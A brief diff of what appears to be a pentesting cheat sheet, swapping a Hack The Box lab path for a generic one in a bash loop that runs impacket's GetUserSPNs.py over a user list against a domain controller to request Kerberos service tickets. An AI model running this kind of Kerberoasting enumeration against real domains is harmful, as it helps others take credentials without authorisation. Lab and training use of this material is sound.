@@ -74,5 +74,5 @@ tar -zxvf archive.tar.gz
 ### impacket scripts using a file containing a list of users (GetUserSPNs as an example)
 
 ```bash
-for i in $(cat ~/Documents/htb/cascade/passwd-guess/list/user.list); do echo $i; ./GetUserSPNs.py -request -dc-ip 10.10.xx.xxx -no-pass -k domain.name/$i; sleep 5; done
+for i in $(cat ~/path/to/user.list); do echo $i; ./GetUserSPNs.py -request -dc-ip 10.10.xx.xxx -no-pass -k domain.name/$i; sleep 5; done
 ```
